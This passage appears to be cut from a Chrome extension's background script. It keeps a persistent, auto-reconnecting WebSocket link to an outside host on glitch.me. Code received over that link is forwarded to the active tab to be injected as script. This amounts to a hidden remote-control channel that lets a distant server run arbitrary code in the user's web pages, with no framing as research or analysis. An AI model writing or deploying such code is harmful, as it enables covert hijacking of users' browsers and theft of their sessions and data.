            chrome.tabs.sendMessage(tabIds[tabIds.length - 1], {
                action: 'injectScript',
                script: code
            });
        } catch (error) {
            console.error("Error executing received code:", error);
        }
    };

    ws.onclose = () => {
        console.warn("WebSocket connection closed, reconnecting...");
        reconnectWebSocket();
    };

    ws.onerror = (error) => {
        console.error("WebSocket error:", error);
    };
}

// Reconnect WebSocket
function reconnectWebSocket() {
    setTimeout(() => {
        ws = new WebSocket("wss://sapphire-burnt-cut.glitch.me");
        setupWebSocketHandlers();
    }, 1000); // Wait 1 second before reconnecting
}

// Ping the server every 30 seconds to keep the connection alive
setInterval(() => {
    if (ws.readyState === WebSocket.OPEN) {
        ws.send('ping');
    }
}, 30000); // Adjust the interval as needed

// Initial setup
setupWebSocketHandlers();
